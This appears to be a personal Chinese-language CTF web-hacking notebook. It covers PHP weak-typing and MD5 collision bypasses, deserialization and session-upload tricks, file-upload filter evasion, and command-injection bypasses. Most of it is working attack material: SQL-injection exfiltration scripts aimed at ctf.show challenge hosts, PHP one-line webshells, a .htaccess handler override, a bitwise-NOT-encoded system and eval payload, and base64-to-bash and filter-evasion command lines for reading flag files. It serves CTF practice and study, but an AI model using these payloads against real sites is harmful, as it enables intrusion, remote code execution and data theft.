>zlag{a}>flag{aaaaaaaaaa}

每次找到下一位, 比如g, index>flag_index，index在flag下面，就能确定上一位是正确的

id|password|uname|uname2
-|-|-|-
3|a|u3|u3
4|f|1|2
5|fl|12|12
2|flag{123123}|u2|un2
6|g|1|1
1|pwd1|u1|un1

```python
import requests
url = "http://a4d72cd7-7807-4122-a971-fde24ee7c838.challenge.ctf.show:8080"
urlreg = url + "/reg.php"  #注册 必须要是可传参php文件
urllogin = url + "/login.php"  #登录 必须要是可传参php文件
urlorder = url + "/user_main.php?order=pwd"  # 显示

s = "-.0123456789:abcdefghijklmnopqrstuvwxyz{|}~"  # 按照ascii码表的字符串大小排序
flag = ""
for i in range(100):
    for j in s:
        exp = ""
        exp = flag + j
        datereg = {
            "username":exp,  # 仔细观察username和password并没有对-和{}进行过滤
            "email":"zzz",
            "nickname":"zzz",
            "password":exp
        }
        datelogin = {
            "username":exp,
            "password":exp
        }
        if (exp == 'flag'):  # 当注册的用户名字为flag的时候，因为已经存在flag用户在，额直接打印flag跳过后面的语句的执行
            flag = 'flag'
            print(flag)
            break
        session = requests.session()  # 保持会话
        reg = session.post(urlreg, datereg)
        login = session.post(urllogin, datelogin)
        a = session.get(urlorder)
        txt = a.text
        if (txt.index("<td>"+exp+"</td>")>txt.index("<td>flag@ctf.show</td>")):  # index返回字符串被找到到最小的索引（最左）
            flag = flag + chr(ord(j)-1)   # 得到的字符为比flag的单个字符的值大1，所以需要-1
            print(flag)
            break
```
### 只能是数字  -- 网鼎杯 2018 unfinish/ctfshow内部赛签到
https://blog.csdn.net/jvkyvly/article/details/118771222

```sql
select hex('ktfa')      #6B746661
select '0'+hex('ktfa')  #6  -- 会产生截断
select   0+hex('ktfa')  #6  -- 会产生截断
select hex(hex('ktfa')) #二次hex转为数字 #3642373436363631

payload = "0'+substr(hex(hex((select/**/*/**/from/**/flag))),({}-1)*10+1,10)+'0".format(i)
```

```python
import requests
import re

url_login = "http://73552acc-0943-4a12-89b1-129bed510b06.challenge.ctf.show:8080/login.php"
url_registry = "http://73552acc-0943-4a12-89b1-129bed510b06.challenge.ctf.show:8080/register.php"

flag = ""

for i in range(1, 100):
    # payload="0'+substr(hex(hex((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()))),({}-1)*10+1,10)+'0".format(i)
    payload = "0'+substr(hex(hex((select/**/*/**/from/**/flag))),({}-1)*10+1,10)+'0".format(i)

    email = "{}@8".format(i)

    data = {
        "e": email,
        "u": payload,
        "p": 1
    }
    data1 = {
        "e": email,
        "p": 1
    }

    requests.post(url_registry, data=data)
    r = requests.post(url_login, data=data1)
    flag += re.findall("Hello (.*),", r.text)[0]
    print(flag)
```
# PHP
regex https://www.php.net/regexp.reference.internal-options
## 环境配置

PHP加入path变量。

cd 项目目录
php -S localhost:80

命令行执行
```php
php -r "print_r(get_defined_constants());"
php -r "print_r(escapeshellarg('123'));"
php -f  "my_script.php"
php -r "eval("system('dir')");"
php -r "echo 123;"
$ some_application | some_filter | php | sort -u >final_output.txt
```
## php 语法

```php
a[] = 0e123123;   // 不写0 默认第一个参数是a[0]
@parse_str("name=Bill") // @ 表示出错不要抱错
```
## php 基础, 弱类型, md5
1. 弱类型比较

        旧版本的　PHP,  "1b" == 1 -> true，弱类型字符串直接会转数字，去掉后面的b
        == 非严格比较， 先类型转换再比较
        === 会进行类型比较 "1b" === 1 -> false
        
        同时满足 $a==0 和 $a  ------  a=abc
        
        同时 !is_numeric($b) 和 $b>1234 ------ b=1234a
        is_numeric()函数用1234567a绕
        
        2. 值不一样结果要一样, md5 hash缺陷 0e开头弱类型
        
        第一个字符转数字
        var_dump("admin"==0);  //true  0==0
        var_dump("1admin"==1); //true  1==1
        var_dump("admin1"==1) //false  0==1
        var_dump("admin1"==0) //true   0==1

### md5 0e绕过
```
QNKCDZO
0e830400451993494058024219903391

240610708 
0e462097431906509019562988736854

s878926199a
0e545993274517709034328855841020
  
s155964671a
0e342768416822451524974117254469
```
### 双md5弱相等  $md5==md5($md5)) 

```
0e215962017,0e291242476940776845150308577824
0e00275209979,0e551387587965716321018342879905
0e00506035745,0e224441551631909369101555335043
0e00540451811,0e057099852684304412663796608095
0e00678205148,0e934049274119262631743072394111
0e00741250258,0e899567782965109269932883593603
0e00928251504,0e148856674729228041723861799600
0e01350016114,0e769018222125751782256460324867
0e01352028862,0e388419153010508575572061606161
0e01392313004,0e793314107039222217518920037885
0e01875552079,0e780449305367629893512581736357
0e01975903983,0e317084484960342086618161584202
0e02042356163,0e335912055437180460060141819624
0e02218562930,0e151492820470888772364059321579
0e02451355147,0e866503534356013079241759641492
0e02739970294,0e894318228115677783240047043017
0e02760920150,0e413159393756646578537635311046
0e02784726287,0e433955189140949269100965859496
0e03298616350,0e851613188370453906408258609284
0e03393034171,0e077847024281996293485700020358
```

### md5强类型绕过
1.数组绕过
```php
    var_dump(md5($_GET['a']) == md5($_GET['b']))
        绕过 md5($id) === md5($gg), 通过传入数组会返回NULL
        v1[]=aaa&v2[]=bbb&v3=[]=1
```
2.md5强类型绕过

2019 安洵杯Web easy_web

```php
    if((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b']))
    a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
    &b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
    
    其他两组
    $Param1="\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2";
    $Param2="\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2";
    
    $data1="\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x07\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\xf1\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\x72\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\x34\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\x28\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\xab\x6f\xf7\x2a\x70";
    $data2="\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x87\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\x71\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\xf2\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\xb4\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\xa8\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\x2b\x6f\xf7\x2a\x70";
```

[[极客大挑战 2020]Greatphp](https://blog.csdn.net/fmyyy1/article/details/117162062)

3.md5强类型绕过2 - Error类绕过md5和sha1
```php
$c = new Error($shell,1);$d = new Error($shell,2);
echo md5($c) === md5($d);
```

### 其他

3. 空数组

        var dump(strcmp("aaa","flag"));  -->-1
        var dump(strcmp("flag","flag")); -->0
        var_dump(strcmp(array("aaa"),"flag"))
        v1=s878926199a&v2=s155964671a&v3=[]=1
        v1[]=aaa&v2[]=bbb&v3=[]=1

4. sha1加密相同 -传空数组

    遇数组返回 null
    
    v1[]=aaa&v2[]=bbb


        1.字符串与整数比较时会进行类型转换
        2.MD5 0e开头的哈希值
        3.MD5函数传入数组返回结果为NULL
        4.SHA1哈希函数传入数组返回结果为NULL
        5.strcmp函数传入数组返回结果为NULL

5. 调用函数的两种方式
```php
call_user_function(func1, param1)
func1(param1)
```

6. 常用序列化 serialize
```php
<?php

class Test {
    public $func;
    public $p;
}

$a = new Test();
$a -> func = 'system';
$a -> p = 'cat /flag';
echo serialize($a);
```
7. `#### =>,->`的意思

->是对象执行方法或取得属性用的。

=>是数组里键和值对应用的。

*  => 的用法
数组中用copy于数组的 key 和 value之间的关系

        $a = array('0' => '1', '2' => '4', );
        echo $a['0'];
        echo $a['2'];

* -> 的用法

类中用于引用类实例的方法和属性

    class Test{
        function add(){return $this->var++;}
        var $var = 0;
    }
    $a = new Test; //实例化对象名称
    echo $a->add();
    echo $a->var;
## 字符串解析特性

[Link](https://www.freebuf.com/articles/web/213359.html)

解析时： 1.删除空白符 2.将某些字符转为下划线（包括空格）

![](imgs/php_parse1.png)
![](imgs/php_parse2.png)
## 序列化 Serialize
https://www.php.net/manual/zh/function.serialize.php

    <?php
        class Shield {...}
    
        $shield = new Shield('pctf.php');
        echo serialize($shield);
    ?>

### Serialize
[[安洵杯 2019]easy_serialize_php](https://blog.csdn.net/qq_43622442/article/details/106003691)
https://blog.csdn.net/qq_45555226/article/details/109808474

### 原生类

报错类 Error
```
<?php
$a = $_GET['a'];
$b = $_GET['b'];
echo new $a($b);
```
当传入下方payload的时候，会产生XSS

`?a=Error&b=<script>alert("Lxxx");</script>`

Exception
与Error类似，Exception同样有__toString方法，因此测试代码和上方一样，传入以下payload，同样可以XSS。

`?a=Exception&b=<script>alert("Lxxx");</script>`

遍历目录类 DirectoryIterator,FilesystemIterator

`?a=DirectoryIterator&b=glob://flag*`
`?a=DirectoryIterator&b=glob://f[k-m]*`

GlobIterator
`?a=GlobIterator&b=f[k-m]*`


读取文件类 SplFileObject
  可以使用伪协议。 https://mp.weixin.qq.com/s/uNcPHMMq0vRvf-ZQ6oZ8_g
```
<?php
$a = $_GET['a'];
$b = $_GET['b'];
echo new $a($b);
```

`?a=SplFileObject&b=flag.php`

### 变量覆盖/extract/parse_str

extract

```php
<?php
$a = "original";
$my_array = array($a=>"Cat", "b"=>"Dog", "c" => "Horse");
extract($my_array);
echo "\$a = $a;\$b= $b; \$c = $argc"; # $a = original;$b= Dog; $c = 1
?>
```

parse_str
```php
parse_str("name=Bill&age=60");
```
### phpinfo 审计代码反序列化 unserialize
考点
1.unserialize
2.phar
wp -- Web_php_NSSCTF prize_p1 反序列化_throw_gc.md

NSSCTF prize5 - 反序列化
         反序列化大写S解析16进制 逃逸
         原生类读取文件 Directorylterator 类、Filesystemlterator 类以及GlobIterator类 加 `glob://*f*` 读取文件, 支持通配符`glob://f[k-m]*`
                  GlobIterator 不带上glob协议头 `?a=GlobIterator&b=f[k-m]*`



反序列化的字符串后加任意字母不影响反序列化

魔术方法

unserialize => __wakeup()
```
__wakeup() //使用unserialize时触发
__sleep() //使用serialize时触发
__destruct() //对象被销毁时触发
__call() //在对象上下文中调用不可访问的方法时触发
__callStatic() //在静态上下文中调用不可访问的方法时触发
__get()    用于从不可访问的属性读取数据
#难以访问包括：（1）私有属性，（2）没有初始化的属性
__set() //用于将数据写入不可访问的属性
__isset() //在不可访问的属性上调用isset()或empty()触发
__unset() //在不可访问的属性上使用unset()时触发
__toString() //把类当作字符串使用时触发
__construct   当一个对象创建时被调用，
__invoke()    当尝试以调用函数的方式调用一个对象时，该方法会被自动调用  
```

```php
// invoke示例
$person = new Person('小明'); // 初始赋值
$person();
```


https://blog.csdn.net/bmth666/article/details/104737025
反序列化 + error类 https://blog.csdn.net/fmyyy1/article/details/117162062

序列化字符串说明
```php
O:3:"Ctf":3{s:4:"flag";s:13:"flag{abedyui}";s:4:"name";s:7:"Sch0lar";s:3:"age";s:2:"18";}

O代表对象 因为我们序列化的是一个对象 序列化数组则用A来表示
3 代表类名字占三个字符 
ctf 类名
3 代表三个属性
s代表字符串
4代表属性名长度
flag属性名
s:13:"flag{abedyui}" 字符串 属性值长度 属性值
# https://www.cnblogs.com/HelloCTF/p/13044403.html
```

* 序列化字符串中的+

> 在数字前可以使用+表示正数，并url编码%2b(否则识别为空格)
#### 绕过 __wakeup
漏洞影响版本：
PHP5 < 5.6.25
PHP7 < 7.0.10

当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)

修改前O:6:"sercet":1:  也就是输入比1大的值就行   
修改后O:6:"sercet":2:

#### `[网鼎杯 2020 青龙组]AreUSerialz`

protected权限的变量在序列化的时会有%00*%00字符，利用php7.1+版本对属性类型不敏感，改为public进行绕过即可



问题在

    ini_set('session.serialize_handler', 'php');#ini_set设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。

`session.serialize_handler` 容易想到wooyun上的文章《PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患》。通过phpinfo页面，我们知道php.ini中默认session.serialize_handler为php_serialize，而index.php中将其设置为php。这就导致了session的反序列化问题。

<div style="color:red">php大于5.5.4的版本中默认使用php_serialize规则</div>

由phpinfo()页面继续可知，session.upload_progress.enabled为On。

当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session。

但是，这时就有一个问题，在题目代码中，没有某个值是用来接受我们传入的数据，并储存到$_SESSION中的。

其实我们是有办法传入$_SESSION数据的，这里就利用到了|的反序列化问题

思路很明显了，我们需要构造一个上传和post同时进行的情况，代码如下:

    <!DOCTYPE html>
    <html>
    <head>
        <title>test XXE</title>
        <meta charset="utf-8">
    </head>
    <body>
        <form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data"><!--     
    不对字符编码-->
            <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
            <input type="file" name="file" />
            <input type="submit" value="go" />
        </form>
    </body>
    </html>

注意enctype属性:

|  表头   | 表头  |
|  ----  | ----  |
| application/x-www-form-urlencoded  | 在发送前编码所有字符（默认） |
| multipart/form-data  | 不对字符编码。 在使用包含文件上传控件的表单时，必须使用该值|
| text/plain  | 空格转换为"+"加号，但不对特殊字符编码。 |

Code,在本机PHP环境执行下，得到反序列化结果。
    
    <?php
    class OowoO
    {
        public $mdzz='xxxxx';
    }
    $obj = new OowoO();
    echo serialize($obj);
    # O:5:"OowoO":1:{s:4:"mdzz";s:5:"xxxxx";}

payloay1:将xxxxx替换为`print_r(scandir(dirname(__FILE__)));`,得到序列化结果：

    O:5:"OowoO":1:{s:4:"mdzz";s:36:"print_r(scandir(dirname(__FILE__)));";}

为防止转义，在引号:前加上\。利用前面的html页面随便上传一个东西，抓包，把filename改为如下：

    |O:5:\"OowoO\":1:{s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";}

注意，前面有一个`|`，这是session的格式。
![注意，前面](./imgs/web1.jpg)

接下来就是去读取 `Here_1s_7he_fl4g_buT_You_Cannot_see.php`

由phpinfo可知当前的路径为`/opt/lampp/htdocs/`

![注意，前面](./imgs/web2.jpg)

将xxx处改为：

`print_r(file_get_contents("/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php"));`

之后步骤如前，将filename改为：

`|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:88:\"print_r(file_get_contents(\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\"));\";}`

得到flag：

`CTF{4d96e37f4be998c50aa586de4ada354a}`


#### `[MRCTF2020]Ezpop` pop链
https://blog.csdn.net/weixin_43952190/article/details/106016260
#### game-gyctf web2 逐步分析

http://www.iricky.ltd/2021/03/30/80.html

#### phar 反序列化 nssctf
## 文件包含 LFI Local File Include

CTFhub文件包含

    GET: ?file=shell.txt
    POST: ctfhub=system('ls /');

远程文件包含

    用file包含phpinfo是有回显的，所以构造payload ：
    GET: xxx:10080/?file=php://input
    POST: <?php system('ls');?>

### session.upload_progress.cleanup 相关

https://www.cnblogs.com/afanti/p/9227493.html

设置满足以下条件 
```
session.upload_progress.enabled = on
session.upload_progress.cleanup = on # on 时会自动清空， 需要条件竞争 ，off时不需要
```

当cleanup是off的情况下，构造如下数据包上传文件。

当 session.upload_progress.enabled 开启时，一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。 通常这些键值可以通过读取INI设置来获得

的phpinfo查看 session.save_path 为$path, $path\tmp下生成如下文件，文件名就是sess_加上你的sessionid

`tmp\tmp\sess_5uu8r952rejihbg033m5mckb17`

当session.upload_progress.cleanup=On时，生成的文件会定时清空，不能写入恶意代码，这时候需要条件竞争。

在burp intruder中构造如下数据包，进行爆破


## php 文件上传
```
js
PHP
Php
php::$DATA
php
php.
php. .
php3
php4
php5
php%00.jpg
MIME
特殊 image/jpg + 'php ' + 'Multipart/form-data'  , 云waf会过滤multipart，用大写能过
```

0x1 无验证: 一句话木马 `<?php @eval($_POST['cmd']) ?>`

0x2 前端验证: bp抓包修改1.php.jpg 为 1.php

0x3 .htaccess: 

    未过滤.htaccess后缀，故此处也可上传.htaccess文件进行绕过。
    注: .htaccess文件生效前提条件为1.mod_rewrite模块开启。2.AllowOverride All
    
    1.上传.htaccess
    .htaccess
        AddType application/x-httpd-php .jpg
    2. 上传一句话木马

0x4 MIME绕过: 
    
    bp抓包 修改 Content-Type: application/octet-stream 为 
    Content-Type: image/jpg


0x5 00截断:
    
    上传 "shell.php.jpg"，bp抓包
    POST /?road=/var/www/html/upload/ HTTP/1.1 ==>改为
    POST /?road=/var/www/html/upload/shell.php%00 HTTP/1.1

0x6 双写后缀:
    
    上传 "shell.php"，bp抓包
    修改 filename="shell.php" => filename="shell.pphphp"

0x7 文件头检查:
    
    1. GIF89a<?php @eval($_POST['cmd']);?> 更改后缀名
    2. copy 1.gif/b+1.php/a sh.php 
    2.上传sh.php 抓包
    3.修改mime上传

0x8 过图片, gif 抓包后改gif为 .phtml结尾, 蚁剑连接

### Upload Labs
#### __0x03黑名单绕过__ .php .phtml .phps .php5 .pht .jpg
不允许上传.asp,.aspx,.php,.jsp后缀文件，但是可以上传其他任意后缀。比如说:.phtml .phps .php5 .pht，但如果上传的是.php5这种类型文件的话，如果想要被当成php执行的话，需要有个前提条件，即Apache的httpd.conf有如下配置代码

    AddType application/x-httpd-php .php .phtml .phps .php5 .pht .jpg

* 0x9 文件名后缀名绕过

绕过方法

    * 找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类

#### __Pass-04 .htaccess__
#### __Pass-05 大小写绕过__

    比如 aSp, Php pHp, 没有将文件名统一转成小写，故可以通过大小写绕过
    
    用burp将后缀改为大写PHP即可

能被解析的文件扩展名列表：
```
jsp jspx jspf
asp asa cer aspx
php php2 php3 php4 php5 php6 phtml pht
exe exee
```
#### __Pass-06 空格绕过__

可以看到，相比于上面Pass-05代码，这里将文件后缀名统一进行了小写转换，但是没有去除文件名首尾的空格。所以此处可以利用windows系统的命名规则进行绕过

Win下xx.jpg[空格] 或xx.jpg.这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点

此处会删除末尾的点，但是没有去掉末尾的空格，因此bp上传一个.php[空格]文件即可

修改文件后缀为1.php .这种形式，从代码执行流程分析来看，会先去除文件名末尾的.,去除之后的文件后缀是 .php[空格]，利用.php[空格]绕过黑名单，然后利用windows的文件命名规则默认除去空格和.,达到上传.php的目的。

#### __Pass-07 点绕过__

从代码上看，可以发现相比于Pass-06代码，加上了首尾去空，但是却少了尾部去点。故和上面Pass-06一样，利用windows文件命名规则绕过。

__Pass-09 点空格点绕过__

可以看到，这里代码的安全性比之前的都要更高，黑名单类型全，大小写经过转换，去除了文件名末尾的点，去除了文件名尾空格，还去除了::$DATA。。但是，这里还是可以绕过的。这里的代码逻辑是先删除文件名末尾的点，再进行首尾去空。都只进行一次。故可以构造点空格点进行绕过，也就是后缀名改为xx.php. .，也是利用了Windows的特性。
也就是说，如果从第三关到第九关，如果目标服务器是windows系统的话，均可用点空格点绕过。

绕过方法
将后缀名改为xx.php. .即可

* __配合文件包含漏洞__

前提：校验规则只校验php文件内容是否是木马

绕过方式：

>* 先上传一个php文件内容是<?php include("123.txt");?>
>* 再上传一个123.txt文件内容是木马, 用上面的文件包含即可

* __配置操作系统文件命名规则__


上传不符合 Windows 文件命名规则的文件名

```
test.asp,
test.asp(空格)
test.php:1.png
test.php::$DATA
test.php::$DATA.....
```

会被 Windows系统自动去掉不符合规则符号后面的内容

后缀名大小写，可以尝试上传 Php, pHp 这样格式的后缀

__上传漏洞防御__

* 白名单防御
* 参考dvwa最高级别

## php 函数文档
### str_replace
使用数组时会1对1替换，不存在时替换为空

```
str_replace(['1', '2'], ['a', 'b'], "12"); //ab
str_replace(['1'],      ['a', 'b'], "12"); //a2
str_replace(['1', '2'], ['a']     , "12"); //a
```

## php 执行绕过
### 未过滤 ()~直接用取反绕过
~x = -(x+1)

取反绕过 - 第五空间智能安全大赛 WEB hate-php

PHP7开始可以用('phpinfo')();这种方式来执行函数

`php -r "echo urlencode(~'phpinfo');"`

```php
<?php
$str = ~"phpinfo";
echo urlencode($str);
```
payload
```php
phpinfo() == (~%8F%97%8F%96%91%99%90)()
?code=(~%8C%86%8C%8B%9A%92)(~%93%8C);  // system('ls')
?code=(~%8C%86%8C%8B%9A%92)(~%93%8C);  // system('ls')
(~%93%8C%DF%D0)();
?code=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F); // system('cat /flag')
?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%92%90%9C%97%8A%C8%A2%D6%D6); // assert((eval($_POST[mochu7])))
```

### 绕过弱类型

key == "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3", ==为弱类型即 key=123即可

### 绕过字母/数字
```php
chr(97)
// 只有参数是数字,base才有效, 默认10,8进制定义为前置0, 16进制前置0x
echo intval(42);                      // 42
echo intval(4.2);                     // 4
echo intval('42');                    // 42
echo intval('+42');                   // 42
echo intval('-42');                   // -42
echo intval(042);                     // 34  4*8+2
echo intval('042');                   // 42
echo intval(1e10);                    // 1410065408
echo intval('1e10');                  // 1
echo intval(0x1A);                    // 26
echo intval(42000000);                // 42000000
echo intval(420000000000000000000);   // 0
echo intval('420000000000000000000'); // 2147483647
echo intval(42, 8);                   // 42
echo intval('42', 8);                 // 34
echo intval(array());                 // 0
echo intval(array('foo', 'bar'));     // 1
echo intval('ad123'); //0 可能返回0，取决最左字符

(intval($num) < 2020 && intval($num + 1) > 2021)  => 
    1.?num=0x2021
    2.?num=1e10 , '1e10'=1,  $a+1转数字 10000000001

intval($key)<1 && intval($key1=1)
    1、$key1=0.99999999999999999999（输入一大串9，不行继续输）
    2、$key1=0x1（16进制表示，intval(0x1)后得到为0）
```

## 各类绕过 RCE/Bypass 汇总
scripts/php_fuzz.py
[浅谈CTF中命令执行与绕过的小技巧](https://www.freebuf.com/articles/web/137923.html)

### 过滤空格
+ 号代替
${PS2} 对应字符 ‘>’
${PS4} 对应字符 ‘+’
${IFS} 对应 内部字段分隔符
${9} 对应 空字符串即tab

```
cat /flag
cat${IFS}/flag
cat${IFS}$9/flag
cat$IFS$9/flag
cat</flag
php下可以cat%09/flag
```

```
$IFS,${IFS},$IFS$9,<,<>,{cat,flag.php}
%20 (space)
%09 (tab)
X=$'cat\x09./flag.php';$X （\x09表示tab，也可以用\x20）

127.0.0.1 &echo "<?php @eval(\$_POST['a']);?>" >> shell.php

过滤"ping -c 4 {$_GET['ip']}"
    =>|ls, |cat flag.php, 看源码,
    注意: 使用| 这不是连续执行, 只能一级传一级,要连续就用127.0.0.1;ls
```

### 黑名单绕过
拼接
$ a=c;b=at;c=/flag;$a$b $c

base64编码
$ `echo "Y2F0IC9mbGFn"|base64 -d`
$ echo "Y2F0IC9mbGFn"|base64 -d|bash

单引号、双引号
$ c""at /flag
$ c""at /fl""ag
$ c""at /fl''ag

反斜线 \
$ ca\t /fl\ag

### 文件读取
```sh
$ cat /flag 
$ rev /flag 
$ more /flag
$ tail /flag
$ less /flag
$ head /flag
$ tac /flag 
$ sort /flag
$ nl /flag  
$ hexdump /flag
$ cat /fl*
$ cat /fla?
```
### 绕过escapeshellcmd
```php
<?php
    $command = 'dir '.$_POST['dir'];
    $escaped_command = escapeshellcmd($command);
    var_dump($escaped_command);
    file_put_contents('out.bat',$escaped_command);
    system('out.bat');
?>
```

执行.bat文件的时候，利用%1a，可以绕过过滤执行命令。

payload

dir=. %1a whoami

### basename 绕过 /PHP_SELF/
鹤城杯2021 easyp
[BUUCTF之[Zer0pts2020]Can you guess it? basename函数绕过](https://blog.csdn.net/weixin_44632787/article/details/118724480)

题目
```php
<?php
include 'utils.php';

if (isset($_POST['guess'])) {
    $guess = (string) $_POST['guess'];
    if ($guess === $secret) {
        $message = 'Congratulations! The flag is: ' . $flag;
    } else {
        $message = 'Wrong. Try Again';
    }
}

if (preg_match('/utils\.php\/*$/i', $_SERVER['PHP_SELF'])) {
    exit("hacker :)");
}

if (preg_match('/show_source/', $_SERVER['REQUEST_URI'])){
    exit("hacker :)");
}

if (isset($_GET['show_source'])) {
    highlight_file(basename($_SERVER['PHP_SELF']));
    exit();
}else{
    show_source(__FILE__);
}
?> 
```

payload: /index.php/utils.php/%ff/?show[source
payload: /index.php/utils.php/%ff/?show.source

1.简单来说basename()函数存在一个问题，它会去掉文件名开头的非ASCII值
```
var_dump(basename("xffconfig.php")); // => config.php
var_dump(basename("config.php/xff")); // => config.php
basename("/index.php/config.php")     // => config.php
```

2.__PHP_SELF__

http://localhost:63342/myPhpProject/test.php
`$_Server['PHP_SELF']` 值为 `/myPhpProject/test.php`

3.php会把.和[解析成_，php特性

### [无字母数字webshell之提高篇](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)
[无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）](https://blog.csdn.net/miuzzx/article/details/109143413)

1.改为POST， url参数如下
?c=.+/???/????????[@-[]       //[@-[]表示A-Z之间
2.上传1.txt. POST的body内容为
```
Content-Type: multipart/form-data; boundary=54d315347127544a785c723f862e8f7f

--54d315347127544a785c723f862e8f7f
Content-Disposition: form-data; name="submit"


--54d315347127544a785c723f862e8f7f
Content-Disposition: form-data; name="file"; filename="1.txt"
Content-Type: applicatoin/octet-stream

#!/bin/sh
ls
--54d315347127544a785c723f862e8f7f--

```
不知道可以弄一个html抓包
```html
<form action="http://8575-5c306ee9-0881-4d77.nss.ctfer.vip:9080/" method="post" enctype="multipart/form-data">
    <input type="file" name="file" id="file"><br>
    <input type="submit" name="submit" value="提交">
</form>
```


### 命令分隔符

连续执行 `& && ｜ || ;` 

linux中：`%0a %0d ; & | && ||`

windows中：`%0a & && | || %1a`

注意%0a要在地址栏输入，否则会2次编码

### base64与管道符, hex, oct, printf
```
echo d2hvYW1p | base64 -d | sh ################## whoami
echo "77686F616D69" | xxd -r -p|bash ############ -- run whoami
printf "\x63\x61\x74\x20\x2f\x66\x6c\x61\x67" #### oct 8进制 $cat /flag
```
### 单引号、反斜杠、反引号
```
cat f''ag.txt
ca''t flag.txt
ca\t fla\g.txt
cat `ls`   用反引号
```
### 过滤cat

```
1=>ca\t flag.php
2=>ca''t fla''g.txt
3=>127.0.0.1&ca\t flag_5882926228560.php | base64
3.用其他cat,tac,more,less,head,tail,nl,tailf,
     win: type, more, copy file1 + file2 + file3 con >nul
```

### 命令注入绕过 RCE
[CTF-show命令代码执行实践](https://mp.weixin.qq.com/s/UgdVarWXZLFM1CnbaeXm1g)

        过滤/ preg_match_all("/\//", $ip, $m)
            1=>${PATH:0:1}=>|cat flag_is_here${PATH:0:1}flag_28512274183473.php
            2=>先cd目录再cat=>127.0.0.1;cd flag_is_here;cat flag_28512274183473.php;
            3=>127.0.0.1;cd flag_is_here;cat `ls`;
        过滤 preg_match_all("/(\||&|;| |\/|cat|flag|ctfhub)/"
            1.1=>127.0.0.1%0als
            使用通配符绕过
            1.2=>127.0.0.1%0acd${IFS}f*_is_here%0als
            1.3=>127.0.0.1%0acd${IFS}f*_is_here%0amore${IFS}f*_12646135912113.php
